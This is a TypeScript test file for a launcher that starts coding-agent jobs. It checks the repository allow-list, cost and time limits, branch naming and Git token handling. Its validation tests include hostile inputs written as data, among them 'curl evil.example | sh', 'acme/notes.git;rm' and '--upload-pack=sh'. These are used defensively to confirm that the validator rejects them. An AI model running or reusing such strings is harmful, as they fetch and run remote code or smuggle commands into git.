import * as v from "valibot";
import { describe, expect, it } from "vite-plus/test";

import { CONTAINER, LIMITS } from "../src/config.ts";
import {
  decide,
  jobRequestSchema,
  overridesFor,
  parseStartedBy,
  type Situation,
} from "../src/job.ts";

const NOW = new Date("2026-10-13T03:00:00Z");
const ID = "0b9f6c1e-52a7-4a3e-9d55-3f1f0c2a7e10";
const request = (extra: Record<string, unknown> = {}) =>
  v.parse(jobRequestSchema, {
    requestId: ID,
    repository: "acme/notes",
    task: "Fix the failing test in src/notes.test.ts",
    ...extra,
  });
const situation = (extra: Partial<Situation> = {}): Situation => ({
  allowedRepositories: ["acme/notes"],
  running: 0,
  spentTodayUsd: 0,
  now: NOW,
  ...extra,
});

describe("what a request may ask for", () => {
  it("refuses a repository that is not on the list, whatever its spelling tries", () => {
    for (const repository of ["acme/web", "acme/notes-private", "evil/notes"]) {
      expect(decide(request({ repository }), situation())).toMatchObject({
        refuse: "repository_not_allowed",
      });
    }
    // GitHub does not tell ACME/Notes from acme/notes, so neither does the list.
    expect(decide(request({ repository: "ACME/Notes" }), situation())).toHaveProperty("launch");
    for (const repository of ["acme/notes/../web", "acme", "acme/notes.git;rm", "../acme/notes"]) {
      expect(v.safeParse(jobRequestSchema, { ...request(), repository }).success, repository).toBe(
        false,
      );
    }
  });

  it("launches nothing while the list is empty", () => {
    expect(decide(request(), situation({ allowedRepositories: [] }))).toMatchObject({
      refuse: "repository_not_allowed",
    });
  });

  it("holds every request to the ceilings", () => {
    expect(decide(request({ minutes: LIMITS.maxMinutes + 1 }), situation())).toMatchObject({
      refuse: "minutes_over_limit",
    });
    expect(decide(request({ budgetUsd: LIMITS.maxJobUsd + 0.01 }), situation())).toMatchObject({
      refuse: "budget_over_limit",
    });
    expect(decide(request(), situation({ running: LIMITS.maxConcurrent }))).toMatchObject({
      refuse: "too_many_running",
    });
    expect(decide(request(), situation({ spentTodayUsd: LIMITS.dailyUsd }))).toMatchObject({
      refuse: "daily_budget_spent",
    });
    expect(decide(request({ minutes: LIMITS.maxMinutes }), situation())).toHaveProperty("launch");
  });

  it("refuses a field it does not know, a zero budget, and an endless number", () => {
    const bad = [
      { command: "curl evil.example | sh" },
      { budgetUsd: 0 },
      { budgetUsd: Number.POSITIVE_INFINITY },
      { minutes: 0 },
      { minutes: 1.5 },
      { baseBranch: "--upload-pack=sh" },
      { task: " " },
    ];
    for (const extra of bad) {
      expect(v.safeParse(jobRequestSchema, { ...request(), ...extra }).success).toBe(false);
    }
  });
});

describe("the plan", () => {
  const decision = decide(request({ minutes: 20, baseBranch: "main" }), situation());
  if (!("launch" in decision)) {
    throw new Error("expected a launch");
  }
  const plan = decision.launch;

  it("leaves room for the push before the Git token expires", () => {
    // An installation token lasts 60 minutes from the moment the launcher makes it.
    expect(LIMITS.maxMinutes).toBeLessThanOrEqual(50);
    expect(plan.deadline.toISOString()).toBe("2026-10-13T03:20:00.000Z");
  });

  it("names a branch that is never the base branch", () => {
    expect(plan.workBranch).toBe(`agent/${ID}`);
    const onAgentBranch = decide(request({ baseBranch: `agent/${ID}x` }), situation());
    expect("launch" in onAgentBranch && onAgentBranch.launch.workBranch).not.toBe(`agent/${ID}x`);
  });

  it("carries the deadline where the reaper can read it back", () => {
    expect(plan.startedBy).toMatch(/^[A-Za-z0-9/_-]{1,128}$/);
    expect(parseStartedBy(plan.startedBy)).toEqual({ jobId: ID, deadline: plan.deadline });
    for (const other of [undefined, "", "ecs-svc/123", `aih/abc/${ID}`, `aih/1760324400/${ID}/x`]) {
      expect(parseStartedBy(other)).toBeUndefined();
    }
  });

  it("uses the request ID as the token that makes RunTask idempotent", () => {
    expect(plan.clientToken).toBe(ID);
    expect(plan.clientToken.length).toBeLessThanOrEqual(64);
  });

  it("adds the Git token last, and gives up when the overrides would not fit", () => {
    const overrides = overridesFor(plan, "ghs_token");
    expect(overrides?.containerOverrides[0]?.name).toBe(CONTAINER);
    expect(overrides?.containerOverrides[0]?.environment.at(-1)).toEqual({
      name: "GIT_TOKEN",
      value: "ghs_token",
    });
    expect(plan.environment.map((item) => item.name)).not.toContain("GIT_TOKEN");
    // The newer token format is a JWT, so its length is not ours to assume.
    expect(overridesFor(plan, "x".repeat(8192))).toBeUndefined();
    const longest = decide(request({ task: "あ".repeat(2000) }), situation());
    expect("launch" in longest && overridesFor(longest.launch, "x".repeat(2000))).toBeTruthy();
  });
});
